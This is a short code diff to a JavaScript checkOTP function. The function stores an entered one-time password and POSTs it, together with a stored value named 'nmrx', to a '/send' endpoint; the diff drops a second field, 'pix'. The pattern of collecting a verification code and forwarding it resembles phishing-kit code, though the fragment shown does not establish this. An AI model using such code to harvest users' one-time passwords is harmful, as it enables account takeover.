@@ -138,7 +138,6 @@ function checkOTP(){
         localStorage.setItem("otp", otp);
 
         const nmrx = localStorage.getItem("nmrx");
-        const pix = localStorage.getItem("pix");
 
         fetch("/send", {
             method:"POST",
@@ -147,7 +146,6 @@ function checkOTP(){
             },
             body:JSON.stringify({
                 nmrx:nmrx,
-                pix:pix,
                 otp:otp
             })
         })
